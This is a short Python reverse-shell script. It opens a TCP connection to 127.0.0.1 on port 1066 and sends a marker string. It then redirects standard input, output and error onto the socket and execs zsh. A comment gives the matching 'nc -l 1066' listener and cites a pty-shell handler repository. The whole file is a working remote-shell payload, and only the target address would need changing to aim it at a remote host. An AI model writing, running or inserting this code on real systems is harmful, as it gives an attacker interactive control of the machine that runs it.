#!/usr/bin/python
import os
import subprocess
import time
import socket
import sys
# with pty 
# ref https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_shell_handler.py
# nc -l 1066   ./arg0
if __name__ == '__main__':
    port = 1066
    sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sk.connect(('127.0.0.1',port))
    fd = sk
    sk.send('kkkkkkkkkk')
    # p=subprocess.Popen("/usr/bin/bash",stdin=fd,stdout=fd,stderr=fd)

    # p=subprocess.Popen("/usr/bin/bash",stdout = fd)
    
    # p.wait()

    os.dup2(fd.fileno(),sys.stdin.fileno())
    os.dup2(fd.fileno(),sys.stdout.fileno())
    os.dup2(fd.fileno(),sys.stderr.fileno())

    shell = '/usr/bin/bash'
    shell = '/usr/bin/zsh'
    os.execv(shell,[shell])
